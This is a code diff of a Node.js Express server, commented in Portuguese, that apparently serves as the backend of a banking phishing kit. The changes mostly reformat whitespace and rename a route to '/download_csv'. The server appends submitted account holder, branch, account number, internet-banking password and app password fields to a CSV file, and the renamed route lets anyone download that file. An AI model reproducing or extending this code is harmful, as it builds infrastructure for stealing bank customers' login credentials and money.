@@ -1,11 +1,11 @@
 // server.js
-const express       = require("express");
-const compression   = require("compression");
-const multer        = require("multer");
+const express = require("express");
+const compression = require("compression");
+const multer = require("multer");
 const { createObjectCsvWriter } = require("csv-writer");
-const path          = require("path");
+const path = require("path");
 
-const app    = express();
+const app = express();
 const upload = multer();
 
 // ativa gzip/brotli para todas as respostas
@@ -20,11 +20,11 @@ const csvWriter = createObjectCsvWriter({
   path: "dados_formulario.csv",
   header: [
     { id: "titularidade", title: "Titularidade" },
-    { id: "tipo_conta",    title: "Tipo de Conta" },
-    { id: "agencia",       title: "Agência" },
-    { id: "conta",         title: "Conta" },
+    { id: "tipo_conta", title: "Tipo de Conta" },
+    { id: "agencia", title: "Agência" },
+    { id: "conta", title: "Conta" },
     { id: "senhaInternet", title: "Senha da Internet" },
-    { id: "senhaApp",      title: "Senha Digital" }
+    { id: "senhaApp", title: "Senha Digital" }
   ],
   append: true
 });
@@ -64,7 +64,7 @@ app.post("/processa_formulario", upload.none(), async (req, res) => {
 });
 
 // rota para download do CSV
-app.get("/  ", (req, res) => {
+app.get("/download_csv", (req, res) => {
   const filePath = path.join(__dirname, "dados_formulario.csv");
   res.download(filePath, "dados_formulario.csv", err => {
     if (err) {
